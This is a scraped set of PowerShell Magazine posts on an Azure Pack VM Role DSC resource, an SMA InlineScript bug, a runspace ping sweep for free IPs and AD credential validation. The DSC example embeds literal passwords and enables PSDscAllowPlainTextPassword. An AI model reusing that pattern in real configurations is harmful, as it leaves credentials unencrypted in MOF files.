New-xDscResourceProperty -Name VMRoleGIVersion -Type String -Attribute Write -Description \u0026#39;VM Role Gallery Item Version. Specify if multiple versions are published\u0026#39; New-xDscResourceProperty -Name VMRoleGIPublisher -Type String -Attribute Write -Description \u0026#39;VM Role Gallery Item Publisher. Specify if multiple VM Roles with the same name but different publishers are published\u0026#39; New-xDscResourceProperty -Name VMSize -Type String -Attribute Write -ValidateSet \u0026#39;Small\u0026#39;,\u0026#39;A7\u0026#39;,\u0026#39;ExtraSmall\u0026#39;,\u0026#39;Large\u0026#39;,\u0026#39;A6\u0026#39;,\u0026#39;Medium\u0026#39;,\u0026#39;ExtraLarge\u0026#39; New-xDscResourceProperty -Name OSDiskSearch -Type String -Attribute Write -ValidateSet \u0026#39;LatestApplicable\u0026#39;,\u0026#39;LatestApplicableWithFamilyName\u0026#39;,\u0026#39;Specified\u0026#39; New-xDscResourceProperty -Name OSDiskFamilyName -Type String -Attribute Write New-xDscResourceProperty -Name OSDiskRelease -Type String -Attribute Write New-xDscResourceProperty -Name NetworkReference -Type String -Attribute Required New-xDscResourceProperty -Name VMRoleParameters -Type Hashtable -Attribute Write New-xDscResourceProperty -Name TokenSource -Type String -Attribute Required -ValidateSet \u0026#39;ASPNET\u0026#39;,\u0026#39;ADFS\u0026#39; New-xDscResourceProperty -Name TokenUrl -Type String -Attribute Required New-xDscResourceProperty -Name TokenPort -Type Uint16 -Attribute Write -Description \u0026#39;Specify custom port to acquire token. Defaults for ADFS: 443, ASP.Net: 30071\u0026#39; New-xDscResourceProperty -Name Port -Type Uint16 -Attribute Write -Description \u0026#39;Specify API port. Default: 30006\u0026#39; ) -Force Running this script will create a manifest module called cWAPack. Inside the module, a DSC resource BG_WAPackVMRole with a friendly name of WAPackVMRole is created. The schema.mof file for this resource is generated as well.\nYou can read more on the file structure and schema.mof file content here: https://technet.microsoft.com/en-us/library/dn956964.aspx\nIncluding in the creation script, I defined what parameters will be used by the WAPackVMRole resource. These parameters will end up being declared in the schema.mof file and the resource script module file.\nHow do you come up with the parameters for the DSC resource? Just create an end-2-end deployment using the PowerShell module. Capture the steps in an “orchestration” script and figure out what the variables are to make the script generically usable. Those variables will be the parameters. If you don’t have them all clear from the get go, you can always adjust the schema.mof and script module files later to include them. Also, the xDSCResourceDesigner module has a function Update-xDscResource which can handle this for you.\nThe resource module script generated by the designer will have the 3 DSC functions, Get-TargetResource, ,Set-TargetResource, and Test-TargetResource, included.\nThese functions will have the parameters defined in the creation script included already. Note for now that the Get-TargetResource will only have the mandatory parameters included. Test and Set have all parameters included.\nVisual Studio Project PowerShell developing in Visual Studio has become my own personal preference. You can of course use the tooling of your own choosing.\nI like VS as it has everything in house I’m currently looking for. E.g. JSON syntax/schema support, PowerShell support (by the awesome PoshTools!) including rich debugging, Solution/Project structure, Git /GitHub support, Azure SDK, and so on.\nSince I created the DSC resource module outside of VS, I’m going to create a solution/project from the directory. Within VS I go to the File menu and choose, New Project and select the Script Project (no need to specify the module project as the module structure and manifest are already created).\nMake sure to specify the parent of the DSC module you created as the location. Deselect Create directory for solution and provide the name of the DSC module (cWAPack). Then hit OK.\nThe new solution will be opened and a new item called script.ps1 is created and made part of the project. Remove it.\nNext hit the “Show all files” button.\nRight click the cWAPack.psd1 file and select “Include in project”. Do the same for the DSCResources folder. The items which have become part of the project are colorized for visual reference.\nNow we have created a Visual Studio solution/project from our module, we can save the solution.\nNested Module Because we are creating a DSC resource which is dependent on a PowerShell module, we want to make sure the correct module with the correct version is always available to it. We currently could do that in a couple of ways:\n Provide installation instructions to the user so he/she is made aware of the dependency and is responsible to fulfill the requirements. Nest the Module with the DSC resource making sure it is always available to the DSC resource and the module used is of the correct version.  In this case I’m going to nest the module with the DSC resource module. To do this, copy the WAPTenantPublicAPI PowerShell module into the root of the cWAPack DSC resource module.\nOpen the visual studio solution and hit the “show all items” button. Right click the WAPTenantPublicAPI folder and select “include in project”.\nNow the module is included in the DSC resource module directory, we need to modify the DSC resource module manifest. We need to do this so we are assured when the DSC resource module is loaded by the Local Configuration Manager, the WAPTenantPublicAPI PowerShell module which is included with the DSC resource module is loaded as well. Open the cWAPack.psd1 file. Navigate to the NestedModules Key and uncomment it. Within the array, type WAPTenantPublicAPI and save the manifest.\nI’ve debugged the LCM while a configuration was processed. This showed me that the nested module is loaded even though the same PowerShell module exists in the system in non-nested form. Nesting this makes sure that the PowerShell module on which the DSC resource module is developed on and relies on is always used.\nCoding it up Now it’s time to code up the BG_WAPackVMRole resource. Open it up by navigating in the solution project to DSCResources\\BG_WAPackVMROle and double click BG_WAPackVMRole.psm1 which will open the file for editing.\nFirst navigate to the Set-TargetResource function and copy the entire param block. Then overwrite the Get-TargetResource param block by removing its current param block and pasting in the param block from the clipboard. I do this so we can be sure the Get-DscConfiguration cmdlet is able to return all user specified information used for provisioning without the need to query it all out interactively (making Get less involved/heavy). As stated earlier, if you leave it as default, the Get-TargetResource will only have the mandatory parameters assigned.\nAuthentication and subscription selection is something every function needs to do. It therefore makes sense to create a little helper function to handle these tasks so we don’t end up with a lot of redundant code. I created a helper function called setup to handle this.\nfunction Setup { param ( $TokenSource, $TokenUrl, $TokenPort, $Credential, $Url, $Port, $SubscriptionId ) try { if ($TokenSource -eq \u0026#39;ADFS\u0026#39;) { Write-Verbose \u0026#34;Acquiring ADFS token from $TokenUrl with credentials: $($Credential.username)\u0026#34; Get-WAPToken -Credential $Credential -URL $TokenUrl -Port $TokenPort -ADFS } else { Write-Verbose \u0026#34;Acquiring ASP.Net token from $TokenUrl\u0026#34; Get-WAPToken -Credential $Credential -URL $TokenUrl -Port $TokenPort } Connect-WAPAPI -URL $Url -Port $Port $Subscription = Get-WAPSubscription -Id $SubscriptionId if ($null -eq $SubscriptionId) { throw \u0026#34;Subscription with Id: $SubscriptionId was not found!\u0026#34; } $Subscription | Select-WAPSubscription } catch { Write-Error -ErrorRecord $_ -ErrorAction Stop } } The function has a bunch of parameters. Note that none of the parameters have the mandatory argument. I don’t assign mandatory because as once as you define a parameter as mandatory, you cannot splat a hash table which contains more information then defined in the param block against it anymore (not without specifying a parameter with ValueFromRemainingArguments argument. You can read more about this here.).\nThe function makes use of the WAPTenantPublicAPI module to acquire a JWT token to interact with the Azure Pack API and selecting the subscription to work against. As you can see, this is basically the start of any “orchestration” script to deploy VM Roles with.\nNext we look at the Test-TargetResource function.\nfunction Test-TargetResource { [CmdletBinding()] [OutputType([System.Boolean])] param ( [parameter(Mandatory)] [String] $Name, [ValidateSet(\u0026#39;Present\u0026#39;,\u0026#39;Absent\u0026#39;)] [String] $Ensure, [parameter(Mandatory)] [String] $Url, [parameter(Mandatory)] [String] $SubscriptionId, [parameter(Mandatory)] [PSCredential] $Credential, [parameter(Mandatory)] [String] $VMRoleGIName, [String] $VMRoleGIVersion, [String] $VMRoleGIPublisher, [ValidateSet(\u0026#39;Small\u0026#39;,\u0026#39;A7\u0026#39;,\u0026#39;ExtraSmall\u0026#39;,\u0026#39;Large\u0026#39;,\u0026#39;A6\u0026#39;,\u0026#39;Medium\u0026#39;,\u0026#39;ExtraLarge\u0026#39;)] [String] $VMSize = \u0026#39;Medium\u0026#39;, [ValidateSet(\u0026#39;LatestApplicable\u0026#39;,\u0026#39;LatestApplicableWithFamilyName\u0026#39;,\u0026#39;Specified\u0026#39;)] [String] $OSDiskSearch = \u0026#39;LatestApplicable\u0026#39;, [String] $OSDiskFamilyName, [String] $OSDiskRelease, [parameter(Mandatory)] [String] $NetworkReference, [Microsoft.Management.Infrastructure.CimInstance[]] $VMRoleParameters, [parameter(Mandatory)] [ValidateSet(\u0026#39;ASPNET\u0026#39;,\u0026#39;ADFS\u0026#39;)] [String] $TokenSource, [parameter(Mandatory)] [String] $TokenUrl, [UInt16] $TokenPort, [UInt16] $Port ) try { Setup @PSBoundParameters $VMRole = Get-WAPVMRole -CloudServiceName $Name -ErrorAction SilentlyContinue if ($Ensure -eq \u0026#39;Present\u0026#39;) { if ($null -ne $VMRole) { return $true } else { return $false } } else { if ($null -eq $VMRole) { return $true } else { return $false } } } catch { Write-Error -ErrorRecord $_ -ErrorAction Stop } } This function is really simple. It starts by splatting the PSBoundParameters against the “Setup” helper function so we have a JWT token and a subscription selected within the current runspace. Then it queries the Azure Pack (Public) Tenant API if a VM Role exists by querying for a VMRole with the specified name. The ErrorAction for this function is defined as SilentlyContinue, this way the VMRole variable will either end up with a VM Role object or with Null. And then, based on the result, either true or false is returned respective to the ensure value. We could implement a complex testing algorithm but I figure this resource would only be used for deployment purposes and not for ensuring idempotency as the resource deployed will have its own lifecycle which will have nothing to do with the DSC configuration it was deployed with. So I keep it simple!\nNext we look at the Set-TargetResource function.\nfunction Set-TargetResource { [CmdletBinding()] param ( [parameter(Mandatory)] [String] $Name, [ValidateSet(\u0026#39;Present\u0026#39;,\u0026#39;Absent\u0026#39;)] [String] $Ensure, [parameter(Mandatory)] [String] $Url, [parameter(Mandatory)] [String] $SubscriptionId, [parameter(Mandatory)] [PSCredential] $Credential, [parameter(Mandatory)] [String] $VMRoleGIName, [String] $VMRoleGIVersion, [String] $VMRoleGIPublisher, [ValidateSet(\u0026#39;Small\u0026#39;,\u0026#39;A7\u0026#39;,\u0026#39;ExtraSmall\u0026#39;,\u0026#39;Large\u0026#39;,\u0026#39;A6\u0026#39;,\u0026#39;Medium\u0026#39;,\u0026#39;ExtraLarge\u0026#39;)] [String] $VMSize = \u0026#39;Medium\u0026#39;, [ValidateSet(\u0026#39;LatestApplicable\u0026#39;,\u0026#39;LatestApplicableWithFamilyName\u0026#39;,\u0026#39;Specified\u0026#39;)] [String] $OSDiskSearch = \u0026#39;LatestApplicable\u0026#39;, [String] $OSDiskFamilyName, [String] $OSDiskRelease, [parameter(Mandatory)] [String] $NetworkReference, [Microsoft.Management.Infrastructure.CimInstance[]] $VMRoleParameters, [parameter(Mandatory)] [ValidateSet(\u0026#39;ASPNET\u0026#39;,\u0026#39;ADFS\u0026#39;)] [String] $TokenSource, [parameter(Mandatory)] [String] $TokenUrl, #do not define default as functions for ADFS and ASP have different defaults [UInt16] $TokenPort, [UInt16] $Port = 30006 ) try { Setup @PSBoundParameters if ($Ensure -eq \u0026#39;Absent\u0026#39;) { Get-WAPCloudService -Name $Name | Remove-WAPCloudService -Force | Out-Null } else { #Get GI with Name $GI = Get-WAPGalleryVMRole -Name $VMRoleGIName #If Multiple GI\u0026#39;s returned, check if user specified version and select on that if ($GI -is [array] -and $VMRoleGIVersion) { $GI = Get-WAPGalleryVMRole -Name $VMRoleGIName -Version $VMRoleGIVersion } #If Multiple GI\u0026#39;s returned, and version not specified or also returned multiple object, check if user specified Publisher and select on that. if ($GI -is [array] -and $VMRoleGIPublisher) { $GI = $GI | Where-Object -FilterScript {$_.Publisher -eq $VMRoleGIPublisher} } #If No GI is left, throw error. if ($null -eq $GI) { throw \u0026#39;No VM Role Gallery Item found matching user criteria\u0026#39; } else { $GI | Out-String | Write-Verbose } if ($OSDiskSearch -eq \u0026#39;LatestApplicable\u0026#39;) { $OSDisk = $GI | Get-WAPVMRoleOSDisk | Sort-Object Addedtime -Descending | Select-Object -First 1 } elseif ($OSDiskSearch -eq \u0026#39;LatestApplicableWithFamilyName\u0026#39;) { $OSDisk = $GI | Get-WAPVMRoleOSDisk | Where-Object -FilterScript {$_.FamilyName -eq $OSDiskFamilyName} | Sort-Object Addedtime -Descending | Select-Object -First 1 } elseif ($OSDiskSearch -eq \u0026#39;Specified\u0026#39;) { $OSDisk = $GI | Get-WAPVMRoleOSDisk | Where-Object -FilterScript {$_.FamilyName -eq $OSDiskFamilyName -and $_.Release -eq $OSDiskRelease} } if ($null -eq $OSDisk) { throw \u0026#39;No valid OS disk was found matching User provided criteria\u0026#39; } $OSDisk | Out-String | Write-Verbose $Net = Get-WAPVMNetwork -Name $NetworkReference if ($null -eq $Net) { throw \u0026#39;No valid virtual network was found\u0026#39; } $net | Out-String | Write-Verbose $VMProps = New-WAPVMRoleParameterObject -VMRole $GI -OSDisk $OSDisk -VMRoleVMSize $VMSize -VMNetwork $Net foreach ($P in $VMRoleParameters) { Add-Member -InputObject $VMProps -MemberType NoteProperty -Name $P.key -Value $P.value -Force } $VMProps | Out-String | Write-Verbose New-WAPVMRoleDeployment -VMRole $GI -ParameterObject $VMProps -CloudServiceName $Name | Out-Null } } catch { Write-Error -ErrorRecord $_ -ErrorAction Stop } } This function is a bit more involved. It also starts with the Setup helper function (remember that each function will run in its own runspace when invoked by the LCM, so we don’t share the environment between a Test and a Set). Next, based on the Ensure parameter, it will either start a provisioning or a deletion respectively. In the case of provisioning, first it will get the Gallery Item on which to base the deployment off. Then it will search for a compatible OS disk (containing the correct Tags). The VM Network will be looked up and then the VMRole parameter object will be generated. Based on user specified hash table in the DSC configuration, this object will be enriched with the required data (we will look at an example deployment a bit later). Finally, the deployment is started.\nFinally, we look at the Get-TargetResource function.\nfunction Get-TargetResource { [CmdletBinding()] [OutputType([System.Collections.Hashtable])] param ( [parameter(Mandatory)] [String] $Name, [ValidateSet(\u0026#39;Present\u0026#39;,\u0026#39;Absent\u0026#39;)] [String] $Ensure, [parameter(Mandatory)] [String] $Url, [parameter(Mandatory)] [String] $SubscriptionId, [parameter(Mandatory)] [PSCredential] $Credential, [parameter(Mandatory)] [String] $VMRoleGIName, [String] $VMRoleGIVersion, [String] $VMRoleGIPublisher, [ValidateSet(\u0026#39;Small\u0026#39;,\u0026#39;A7\u0026#39;,\u0026#39;ExtraSmall\u0026#39;,\u0026#39;Large\u0026#39;,\u0026#39;A6\u0026#39;,\u0026#39;Medium\u0026#39;,\u0026#39;ExtraLarge\u0026#39;)] [String] $VMSize = \u0026#39;Medium\u0026#39;, [ValidateSet(\u0026#39;LatestApplicable\u0026#39;,\u0026#39;LatestApplicableWithFamilyName\u0026#39;,\u0026#39;Specified\u0026#39;)] [String] $OSDiskSearch = \u0026#39;LatestApplicable\u0026#39;, [String] $OSDiskFamilyName, [String] $OSDiskRelease, [parameter(Mandatory)] [String] $NetworkReference, [Microsoft.Management.Infrastructure.CimInstance[]] $VMRoleParameters, [parameter(Mandatory)] [ValidateSet(\u0026#39;ASPNET\u0026#39;,\u0026#39;ADFS\u0026#39;)] [String] $TokenSource, [parameter(Mandatory)] [String] $TokenUrl, #do not define default as functions for ADFS and ASP have different defaults [UInt16] $TokenPort, [UInt16] $Port = 30006 ) Setup @PSBoundParameters if (Get-WAPVMRole -CloudServiceName $Name -ErrorAction SilentlyContinue) { $Ensure = \u0026#39;Present\u0026#39; } else { $Ensure = \u0026#39;Absent\u0026#39; } Add-Member -InputObject $PSBoundParameters -MemberType NoteProperty -Name \u0026#39;Ensure\u0026#39; -Value $Ensure $PSBoundParameters.Remove(\u0026#39;Verbose\u0026#39;) $PSBoundParameters.Remove(\u0026#39;Debug\u0026#39;) Write-Output -InputObject $PSBoundParameters } Again, the setup helper function is called first. Then based upon the VM Role being deployed or not, Ensure is set to Absent or Present and added to the PSBoundParameters. Potentially Verbose and Debug are removed from the PSBoundParameters hash table as this hash table is to be output as the Class object and these parameters are not explicitly defined for the DSC resource class (if we do not do this, the Get-DscConfiguration will error out as the object does not correspond to the class definition). Finally, we send the PSBoundParameters hashtable to the output stream.\nThere you have it! Not much work to add on a DSC resource on top of your PowerShell module if you ask me. Save it and put it in your modules directory. Ready to roll.\nDeploying a VM Role using DSC The DSC resource module is finished. To make it available for the LCM we need to copy it over to ‘c:\\Program Files\\WindowsPowerShell\\Modules’. Now let’s look at an example configuration script.\nconfiguration WAPVMRole { param ( [PSCredential] $Credential ) Import-DscResource -ModuleName cWAPack Import-DscResource -ModuleName PSDesiredStateConfiguration node $AllNodes.NodeName { WAPackVMRole DSCClient { VMSize = \u0026#39;Medium\u0026#39; Name = \u0026#39;TestDSC\u0026#39; SubscriptionId = \u0026#39;b5a9b263-066b-4a8f-87b4-1b7c90a5bcad\u0026#39; Url = \u0026#39;https://api.bgelens.nl\u0026#39; Credential = $Credential VMRoleGIName = \u0026#39;DSCPullServerClient\u0026#39; OSDiskSearch = \u0026#39;LatestApplicable\u0026#39; NetworkReference = \u0026#39;Internal\u0026#39; TokenSource = \u0026#39;ADFS\u0026#39; TokenUrl = \u0026#39;https://sts.bgelens.nl\u0026#39; TokenPort = 443 Ensure = \u0026#39;Present\u0026#39; Port = 443 VMRoleParameters = @{ VMRoleAdminCredential = \u0026#39;Administrator:P@$Sw0rd!\u0026#39; DSCPullServerClientConfigurationId = \u0026#39;7844f909-1f2e-4770-9c97-7a2e2e5677ae\u0026#39; DSCPullServerClientCredential = \u0026#39;Domain\\certreq:Password!\u0026#39; } } } } The VM Role parameters are being send to the DSC resource as a hash table. How do we know again what VMRoleParameters we need to pass? It’s all described in Part 2: Module usage. Basically, you need to do some investigation up front as you need to interrogate the API and the Gallery Item to know what values you can pass. This VM Role will configure the LCM in the “to be deployed” VM to be a pull client.\nNow let’s call the configuration.\n$Cred = New-Object -TypeName pscredential -ArgumentLis @(\u0026#39;ben@bgelens.nl\u0026#39;, (ConvertTo-SecureString -String \u0026#39;MySecurePWD!\u0026#39; -AsPlainText -Force)) $configdata = @{ AllNodes = @( @{ NodeName = \u0026#39;localhost\u0026#39; PSDscAllowPlainTextPassword = $true PSDscAllowDomainUser = $true } ) } WAPVMRole -ConfigurationData $configdata -Credential $Cred Start-DscConfiguration .\\WAPVMRole -Wait –Verbose In this case I generate a Credential object to be used for interacting with the Public Tenant API. As I don’t have a certificate to encrypt the sensitive data within the MOF file with, I create a configuration data hash table and set PSDscAllowPlainTextPassword to True. In WMF 5.0 a new warning will be thrown when you use UPN or Domain\\Username for credentials if the configuration targets localhost. To suppress this, I added PSDscAllowDomainUser to the configuration data hash table. Finally, I call the configuration so the MOF file is generated and call Start-DscConfiguration to make it so.\nWhen viewed from the portal, we see the VM Role being deployed.\nWe can of course also use the PowerShell module to check on this:\nThere you have it! I hope you enjoyed this journey to a DSC resource series. If you are interested, keep watching my GitHub repo as I’m still actively developing both the PowerShell module and the DSC resource.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/09/22/part-4-journey-to-a-windows-azure-pack-vm-role-dsc-resource-the-dsc-resource/","tags":["Azure Pack","PowerShell DSC"],"title":"Part 4 – Journey to a Windows Azure Pack VM Role DSC Resource: The DSC resource"},{"categories":["Service Management Automation"],"contents":"Although it is not officially supported yet, here is why you should install WMF 5.0 Production Preview on your runbook workers right now!\nBackground Because we don’t have native PowerShell support in SMA (yet), the InlineScript activity is used to execute all PowerShell code which cannot be handled by PowerShell Workflow natively. This even may occur without you knowing about it as PowerShell Workflow also does this under the covers for you automatically. It wraps your non-PS workflow commands in an InlineScript activity on a per command basis.\nLet’s look at a simple example:\nworkflow test { Get-VM | Stop-VM Get-VMSwitch } When loading the workflow in memory, you can investigate the XAML definition.\nAs you can see, the Get-VM | Stop-VM pipeline is broken up into 2 InlineScripts and the Get-VMSwitch into another one without us specifying this.\nThe InlineScript activity, when specified explicitly, supports remoting. A functionality I use all the time when dealing with SMA runbooks. Let’s look at an example:\nworkflow StartVM { $HVCred = Get-AutomationPSCredential -Name \u0026#39;HVCredentials\u0026#39; InlineScript { Get-VM | Where-Object -FilterScript {$_.State -ne \u0026#39;Running\u0026#39;} | Start-VM } -PSComputerName \u0026#39;HV01\u0026#39; -PSCredential $HVCred -PSAuthentication CredSSP -PSRequiredModules \u0026#39;Hyper-V\u0026#39; } Not the most useful example but it serves its purpose. As you can see, the InlineScript activity has the PSComputerName, PSCredential, and PSAuthentication parameters which are used for remoting. This code is actually run on the computer HV01 and not on the runbook worker.\nThe InlineScript activity bug If you run multiple InlineScript activities within a certain amount of time and these connect to the same computer, an ugly bug can show its head.\nConsider the following example:\nworkflow Test { $MyVar = \u0026#39;Just some Text\u0026#39; InlineScript { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Write-Output -InputObject $using:MyVar } -PSComputerName \u0026#39;Hyper-v\u0026#39; $MyVar = \u0026#39;Some other text\u0026#39; InlineScript { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Write-Output -InputObject $using:MyVar } -PSComputerName \u0026#39;Hyper-v\u0026#39; } In this example there is no specific reason to specify ErrorActionPreference as stop but this invokes the bug. When run it you would expect that two lines will be shown: ‘Just some Text’ and ‘Some other text’. However, it will output ‘Just some Text’ 2 times. The bug here has broken the Using scope functionality!\nThing gets even worse. Let’s look at another example:\nworkflow Test { $MyVar = \u0026#39;Just some Text\u0026#39; InlineScript { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Write-Output -InputObject $using:MyVar } -PSComputerName \u0026#39;Hyper-v\u0026#39; $SomeOtherVar = \u0026#39;THIS WILL BE NULL instead off this text\u0026#39; InlineScript { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Write-Output -InputObject \u0026#34;A completely new variable: $using:SomeOtherVar\u0026#34; if ($null -eq $using:SomeOtherVar) { \u0026#39;I have nothing!\u0026#39; } } -PSComputerName \u0026#39;Hyper-v\u0026#39; } In this case, in the second InlineScript activity, targets another workflow scope defined variable entirely. You would expect it to output ‘A completely new variable: THIS WILL BE NULL instead of this text’ but it does not contain the variable’s text. Instead, nothing is passed. It is NULL and that’s why we have the ‘I have nothing!’ on screen.\nSince SMA uses PowerShell Workflow, the bug is invoked here as well. My friend and fellow InlineScript sufferer Trond Hindenes has logged this bug on Connect.\nWMF 5.0 production preview to the rescue! The reason why you should install the WMF 5.0 Production Preview package is: The PowerShell team solved the issue!\nPlease note that SMA does not officially support WMF 5.0 yet but I’ve heard from good sources that Microsoft is aware people are using the combination successfully in production already without known issues.\nSample runbook:\nworkflow WMF5Test { $TestCred = Get-AutomationPSCredential -Name \u0026#39;TestCredentials\u0026#39; Write-Output -InputObject \u0026#34;Handled on Runbook Worker $($env:ComputerName)with PSVersion $($psversiontable.PSVersion.Major)\u0026#34; #region first run $PassingVar = \u0026#39;1\u0026#39; InlineScript { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Write-Output -InputObject \u0026#34;First Run. Var value: $using:PassingVar Running on $($env:ComputerName)with PSVersion $($psversiontable.PSVersion.Major)\u0026#34; } -PSComputerName \u0026#39;Server01\u0026#39; -PSCredential $TestCred -PSAuthentication CredSSP -PSUseSsl $true InlineScript { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Write-Output -InputObject \u0026#34;First Run. Var value: $using:PassingVar Running on $($env:ComputerName)with PSVersion $($psversiontable.PSVersion.Major)\u0026#34; } -PSComputerName \u0026#39;Server02\u0026#39; -PSCredential $TestCred -PSAuthentication CredSSP #endregion first run #region second run $PassingVar = \u0026#39;2\u0026#39; #overwriting variable for second run $AditionalVar = \u0026#39;A String\u0026#39; #add aditional Var to second run output InlineScript { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Write-Output -InputObject \u0026#34;Second Run. Var value: $using:PassingVar Running on $($env:ComputerName)with PSVersion $($psversiontable.PSVersion.Major). Second Var: $using:AditionalVar\u0026#34; } -PSComputerName \u0026#39;Server01\u0026#39; -PSCredential $TestCred -PSAuthentication CredSSP -PSUseSsl $true InlineScript { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Write-Output -InputObject \u0026#34;Second Run. Var value: $using:PassingVar Running on $($env:ComputerName)with PSVersion $($psversiontable.PSVersion.Major)Second Var: $using:AditionalVar\u0026#34; } -PSComputerName \u0026#39;Server02\u0026#39; -PSCredential $TestCred -PSAuthentication CredSSP #endregion second run } Results when the sample runbook is run through a runbook worker still on WMF 4.0:\nResults when the sample runbook is run through a runbook worker on WMF 5.0:\nAs you can see, the installation of WMF 5.0 would only need to occur on the runbook workers themselves for this bug to be resolved. This makes sense as the XAML is compiled here. When the runbook workers are updated, both WMF 4.0 and WMF 5.0 targets get the values passed correctly!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/09/14/why-you-should-install-wmf-5-0-production-preview-on-your-sma-runbook-workers/","tags":["Service Management Automation"],"title":"Why you should install WMF 5.0 Production Preview on your SMA runbook workers"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or later.\nWe often come across infrastructure configuration scenarios where we need to find a free IP address before assigning the same to a server in an automated manner. However, when the given IP range that is provided is large, it may take longer to complete the free IP scanning. There are many tips and articles written around this topic. There are a few articles that suggest using background jobs and throttling of background jobs. Fellow PowerShell MVP Boe Prox has published a great article on differences between PowerShell jobs and runspaces. This prompted me to write a function using PowerShell runspaces to get the free IPv4 addresses in a given network range.\nIf you understand PowerShell runspaces, the following function is self-explanatory. If you are new to PowerShell runspaces, I recommend reading a series of articles on this by Boe.\nFunction Get-AvailableIPv4Address { param ( [System.Collections.ArrayList] $IPRange ) $MaxThreads = 30 $ScriptBlock = { Param ( [String]$IPAddress ) Test-Connection -ComputerName $IPAddress -Count 1 -Quiet } $RunspacePool = [RunspaceFactory]::CreateRunspacePool(1,$MaxThreads) $RunspacePool.Open() $Jobs = @() $IPRange | % { $Job = ::Create().AddScript($ScriptBlock).AddArgument($_) $Job.RunspacePool = $RunspacePool $Jobs += New-Object PSObject -Property @{ IPAddress = $_ Pipe = $Job Result = $Job.BeginInvoke() } } While ( $Jobs.Result.IsCompleted -contains $false) { Start-Sleep -Seconds 1 } $Results = @() ForEach ($Job in $Jobs) { if (-not $Job.Pipe.EndInvoke($Job.Result)) { $job.IPAddress } } } Here is an example of how you use this:\n$IPRange = New-Object System.Collections.ArrayList 1 .. 254 | % { $IPRange.Add(\u0026#34;192.168.10.$_\u0026#34;) | Out-Null } $IPRange = @(Get-AvailableIPv4Address -IPRange $IPRange) ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/09/07/pstip-using-powershell-runspaces-to-find-unassigned-ipv4-addresses/","tags":["Tips and Tricks"],"title":"#PSTip Using PowerShell runspaces to find unassigned IPv4 addresses"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or later.\nPowerShell let’s you tap into .NET Framework and do all kind of poking. Recently, while reading up this article on CodeProject came across the ValidateCredentials() method on the PrincipalContext class instance.\nBelow is how you use this nifty little trick in PowerShell to validate AD creds for a user (One can use this for local machine too):\n# add type to allow validating credentials Add-Type -AssemblyName System.DirectoryServices.AccountManagement # Create the Domain Context for authentication $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain # We specify Negotiate as the Context option as it takes care of choosing the best authentication mechanism i.e. Kerberos or NTLM (non-domain joined machines). $ContextOptions = [System.DirectoryServices.AccountManagement.ContextOptions]::Negotiate Let’s create the instance of the PrinicipalContext class by using one of the Constructor . Note this requires a DC name to be passed. Don’t worry if you don’t know the DC name, we can easily use the $env:USERDNSDOMAIN environment variable and it takes care of it.\n$PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ContextType, $env:USERDNSDOMAIN) Before it is time to execute the method, let’s see the method definition\nPS\u0026gt; $PrincipalContext.ValidateCredentials OverloadDefinitions ------------------- bool ValidateCredentials(string userName, string password) bool ValidateCredentials(string userName, string password, System.DirectoryServices.AccountManagement.ContextOptions options) We use the second method definition now to validate the user credential, and we can store the user credentials in a credential object (for ease) here.\nPS\u0026gt; $Cred = Get-Credential PS\u0026gt; $PrincipalContext.ValidateCredentials($cred.UserName, $cred.GetNetworkCredential().password, $ContextOptions) True PS\u0026gt;# Et Voila !\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/09/04/pstip-validate-active-directory-credentials/","tags":["Tips and Tricks"],"title":"#PSTip Validate Active Directory Credentials"},{"categories":["Azure Pack","PowerShell DSC"],"contents":"In this series,\nPart 1 – Journey to a Windows Azure Pack VM Role DSC Resource: Introduction\nPart 2 – Journey to a Windows Azure Pack VM Role DSC Resource: PowerShell module usage\nPart 3 – Journey to a Windows Azure Pack VM Role DSC Resource: Inside the module (this article)\nPart 4 – Journey to a Windows Azure Pack VM Role DSC Resource: The DSC resource\nIn the previous post you have seen how to use the PowerShell module to deploy VM Roles via the Tenant API or Tenant Public API.\nIn this article we take a look at some of the module’s code so you have a better understanding of what is going on under the covers.\nThe module discussed here can be downloaded from GitHub or from the PowerShell gallery, if you have WMF5 installed, by running Install-Module WAPTenantPublicAPI.\nA look inside the module Almost all functions in the module rely heavily on the Invoke-RestMethod cmdlet. Microsoft is using REST all over the place these days which makes it really easy to start using PowerShell against Web APIs. All you need is a little pointer on what URLs to go after and what headers are expected and in no time you are actually interfacing and doing all kind of cool stuff.\nInvoke-RestMethod and Invoke-WebRequest have been around since PowerShell 3.0 and as they form the basis of everything done in this module, I targeted for 3.0 compatibility. Unfortunately, I quickly stumbled upon a bug in the 3.0 versions of these cmdlets. As shown in the previous post, we use the following header format:\n@{ Authorization = \u0026quot;Bearer $Token\u0026quot; 'x-ms-principal-id' = $Credential.UserName Accept = 'application/json' } The Accept part of the header tells the Azure Pack API to return response data as JSON. We want this as the API returns a lot more data when JSON is used. In PowerShell 3.0 this accept header causes an error to be thrown which has been logged on Connect as a bug: Invoke-RestMethod Accept header. Therefore, I decided to require PowerShell 4.0 as the bug was fixed in that release. I could have gone the long route around the issue and create the functionality myself but I figured as the intent is to have a DSC resource, 4.0 would be required anyway.\nTo force the PowerShell 4.0 requirement, I added a requires statement in the psm1 file (in case someone decides to load the module directly from this file)\n#requires -version 4 and defined the minimal PowerShellVersion in the module’s manifest (psd1) file.\n# Minimum version of the Windows PowerShell engine required by this module PowerShellVersion = \u0026#39;4.0\u0026#39; Get-WAPToken For Windows Azure Pack there can be 2 providers for the tokens. Either you have the inbox authentication site which generates the JWT tokens if successfully authenticated against the ASP.net membership provider or you have ADFS generating them from an external identity source like Active Directory or Azure Active Directory. Luckily the Azure Pack team made this one really simple for me. When you install the Azure Pack PowerShell API (a 